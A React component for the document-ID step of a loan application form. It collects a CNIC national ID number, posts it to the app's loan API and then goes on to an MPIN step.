import React, { useState } from "react";
import { IdCard } from "lucide-react";
import { useNavigate } from "react-router-dom";
import { useLoanApplication } from "./useLoanApplication";
import { Field, StepNavigation, StepShell } from "./LoanStepShell";
import { postLoanStep } from "./loanApi";

export default function LoanDocumentIdPage() {
  const { docId, setDocId } = useLoanApplication();
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const continueToMpin = async () => {
    setLoading(true);
    setError("");
    try {
      await postLoanStep("documentID", { documentId: docId.trim() });
      navigate("/loan/mpin");
    } catch (requestError) {
      setError(requestError.message);
    } finally {
      setLoading(false);
    }
  };
  return (
    <>
      <StepShell icon={<IdCard size={18} className="text-teal-600" />} title="Document ID" subtitle="Enter your CNIC / national ID number">
        <Field label="CNIC number" icon={<IdCard size={16} className="text-slate-400 shrink-0" />} value={docId} onChange={setDocId} placeholder="e.g. 42101-XXXXXXX-X" />
      </StepShell>
      {error && <p className="px-5 pt-3 text-xs text-red-500">{error}</p>}
      <StepNavigation nextPath="/loan/mpin" nextLabel="Continue to MPIN" disabled={docId.trim().length < 4} onNext={continueToMpin} loading={loading} />
    </>
  );
}
